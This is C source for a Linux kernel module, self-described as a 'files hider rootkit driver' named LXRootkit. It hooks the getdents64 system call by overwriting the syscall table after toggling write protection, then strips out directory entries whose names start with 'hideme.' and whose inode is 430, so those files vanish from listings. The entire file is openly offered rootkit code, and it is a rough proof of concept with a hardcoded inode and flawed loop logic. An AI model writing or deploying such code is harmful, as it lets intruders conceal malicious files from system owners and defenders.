
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/version.h>
#include <linux/smp.h>
#include <linux/string.h> 
#include <linux/dirent.h>
#include <linux/file.h>

#include "hfiles/hooks.h"

// default configuration...
MODULE_LICENSE("GPL");
MODULE_AUTHOR("dan0xcc");
MODULE_DESCRIPTION("files hider rootkit driver"); 
MODULE_VERSION("1.00");

#define SECRET "hideme."
#define SIZE_SECRET \
    (sizeof(SECRET) - 1)

int (*org_sys_getdents64)(
        struct pt_regs*
    ); 

// RDI, RSI, RDX, R10, R8, R9 - params0-5
asmlinkage int my_sys_getdents64(
        struct pt_regs *regs
        )
{
     
  /* 
params: 
    RDI: fd 
    RSI: linux_dirent64 structure pointer 
    RDX: dirent
    R10: count 
    */  
  
    /* restore the function pointer to return to original handler */ 
    org_sys_getdents64 = hi.originalFunc; 
    int ret = org_sys_getdents64(regs); 

    if(ret <= 0) 
        return ret; 

    int offset = 0; 
    char* cur = (char*)regs->si; 
    struct linux_dirent64 *next = (struct linux_dirent64*)regs->si; 

    while(offset < ret) 
    {
        next = (struct linux_dirent64*)(cur + offset); 

        if(strncmp(next->d_name, SECRET, SIZE_SECRET) == 0) 
        {
            /* a poc that shows how we might hide files with the same name but in different dirs, 
             * since when were applying the hook it will mask everything that starts with our generic name. Thus, we can create a function which takes the inumber and compares it against our secert file, if it's equal we we hide it, if not we return the default state of the directory. *
            here I just show how it might be working, since I can dump inumber with - ls -i.  
            */ 
             
            if(next->d_ino != 430) 
                return ret;
            // here we take the next entry & copy it to our current entry which we've found,
            memcpy(cur + offset, cur + offset + next->d_reclen, ret - (offset  + next->d_reclen)); 
            // redfine the return value little bit , so it returns with a differnt state. 
            ret -= next->d_reclen; 
            
        } 
        
        /* calc the next entry */ 
        offset += next->d_reclen;
            
    }
    
    return ret; 
}

static int __init rootkit_init(void) {
    printk(KERN_INFO "[*] Loadiung LXRootkit..."); 

    /* setting the hook */ 
    set_hook(my_sys_getdents64, __NR_getdents64); 
   
    return 0; 
}

static void __exit rootkit_exit(void) {

    printk(KERN_INFO "[*] Unloading LXRootkit...\n"); 
    printk(KERN_INFO "[*] Unhooking...\n");
    
    wpOFF(); 
    hi.sstb[hi.nr] = hi.originalFunc;  
    wpON(); 
}
module_init(rootkit_init); // invokes loading 
module_exit(rootkit_exit); // invokes unloading 



